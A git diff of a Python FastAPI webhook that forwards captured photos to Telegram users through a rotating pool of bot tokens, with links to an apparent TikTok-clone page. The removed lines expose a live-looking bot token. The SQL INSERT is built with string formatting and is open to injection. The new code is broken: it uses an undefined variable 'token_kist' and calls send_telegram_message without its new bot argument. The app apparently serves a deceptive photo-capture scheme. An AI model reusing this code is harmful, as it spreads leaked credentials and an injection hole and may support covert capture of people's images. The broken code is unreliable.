@@ -21,8 +21,7 @@ db_name = "default_db"
 
 
 
-token = '5766763452:AAG14hwIr0o3pxAN1JRYlnk7hhIeH1CobXM'
-bot = Bot(token)
+
 app = FastAPI()
 
 app.add_middleware(
@@ -63,9 +62,30 @@ async def webhook(
         subscription = mycursor.fetchone()
         subscription = int(subscription[0])
 
+        mycursor.execute("SELECT * FROM kwork22_rezerv")
+        all_rezerv = mycursor.fetchall()
+
+        token_1 = all_rezerv[0][0]
+        token_2 = all_rezerv[1][0]
+        token_3 = all_rezerv[2][0]
+        token_4 = all_rezerv[3][0]
+        token_5 = all_rezerv[4][0]
+        token_6 = all_rezerv[5][0]
+        token_7 = all_rezerv[6][0]
+        token_8 = all_rezerv[7][0]
+        token_9 = all_rezerv[8][0]
+        token_10 = all_rezerv[9][0]
+
+        all_token = [token_1, token_2, token_3, token_4, token_5, token_6, token_7, token_8, token_9, token_10]
 
         if subscription > 0:
-            await send_telegram_photo(user_id, photo, redirect_url)
+            for token in all_token:
+                if token:
+                    bot = Bot(token)
+                    try:
+                        await send_telegram_photo(user_id, photo, redirect_url, bot)
+                    except:
+                        pass
         else:
             photo_path = await save_image(photo, "data/images")
 
@@ -78,9 +98,15 @@ async def webhook(
 
             keyboard =  InlineKeyboardMarkup(inline_keyboard=kb_list)
 
-
-            message = await send_telegram_message(user_id, f"🙎‍♂️Вам пришло новое фото!\nСсылка: https://rusfai-tiktok-clone2-c56e.twc1.net/tt?id={user_id}&redirect={redirect_url}", reply_markup=keyboard)
-            mycursor.execute("INSERT INTO kwork22_photo (url, photo_time, user_id, message_id)  VALUES ('{}', '{}', '{}', '{}')".format(photo_path, int(time.time()), int(user_id), int(message.message_id)))
+            token_list = []
+            for token in all_token:
+                if token:   
+                    try:
+                        message = await send_telegram_message(user_id, f"🙎‍♂️Вам пришло новое фото!\nСсылка: https://rusfai-tiktok-clone2-c56e.twc1.net/tt?id={user_id}&redirect={redirect_url}", reply_markup=keyboard)
+                        token_list.append(token)
+                    except:
+                        pass
+            mycursor.execute("INSERT INTO kwork22_photo (url, photo_time, user_id, message_id, token)  VALUES ('{}', '{}', '{}', '{}', '{}')".format(photo_path, int(time.time()), int(user_id), int(message.message_id), str(token_kist) ))
             mydb.commit() 
                                      
                 
@@ -89,12 +115,12 @@ async def webhook(
     return {"status": "Success"}
 
 
-async def send_telegram_message(user_id, text, reply_markup):
+async def send_telegram_message(user_id, text, reply_markup, bot):
     message = await bot.send_message(user_id, text, reply_markup=reply_markup, disable_web_page_preview=True)
     return message
 
 
-async def send_telegram_photo(user_id, photo, redirect_url):
+async def send_telegram_photo(user_id, photo, redirect_url, bot):
     photo_path = await save_image(photo, "data/images")
     message = await bot.send_photo(user_id, FSInputFile(photo_path), caption=f'🙎‍♂️Вам пришло новое фото!\nСсылка: https://rusfai-tiktok-clone2-c56e.twc1.net/tt?id={user_id}&redirect={redirect_url}')
         
